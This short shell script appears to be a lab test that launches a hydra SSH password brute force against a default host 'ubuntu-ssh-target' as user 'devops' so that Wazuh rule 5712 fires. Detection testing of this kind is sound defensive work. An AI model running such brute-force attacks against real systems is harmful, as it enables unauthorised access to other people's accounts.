#!/bin/sh
# Reproducible SSH brute force to trigger Wazuh rule 5712 (>= level 10).
TARGET="${TARGET:-ubuntu-ssh-target}"
USER="${SSH_USER:-devops}"
echo "[*] SSH brute force: ${USER}@${TARGET}"
# -f stop on first success, -V verbose, -t 4 parallel tasks
hydra -l "$USER" -P /opt/passwords.txt -t 4 -f -V "ssh://${TARGET}" || true
echo "[*] attack complete"